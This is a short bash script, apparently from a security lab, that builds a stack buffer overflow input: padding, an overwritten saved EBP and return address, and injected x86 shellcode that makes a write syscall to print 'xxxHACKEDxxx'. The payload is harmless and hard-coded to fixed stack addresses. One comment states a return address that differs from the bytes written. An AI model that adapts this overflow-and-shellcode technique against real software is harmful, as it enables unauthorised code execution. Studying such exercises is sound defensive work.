#!/bin/bash

# write 12 'A's to buff and its padding
perl -e 'print "A"x12;' > input.txt

# write value 0xbffffe68 to the saved EBP, to preserve the old EBP (actually not necessary)
perl -e 'print "\x68\xfe\xff\xbf";' >> input.txt 

# write new return address 0xbfffe68
perl -e 'print "\x70\xfe\xff\xbf";' >> input.txt

# write "xxxHACKEDxxx\0" to stack
perl -e 'print "xxxHACKEDxxx\0\0\0\0";' >> input.txt

# inject "movl $12, %edx"
perl -e 'print "\xba\x0c\x00\x00\x00";' >> input.txt

# inject "movl $0xbffffe60,%ecx"
perl -e 'print "\xb9\x60\xfe\xff\xbf";' >> input.txt

# inject "movl $1,%ebx"
perl -e 'print "\xbb\x01\x00\x00\x00";' >> input.txt

# inject "movl $4,%eax"
perl -e 'print "\xb8\x04\x00\x00\x00";' >> input.txt

# inject "int $0x80"
perl -e 'print "\xcd\x80";' >> input.txt
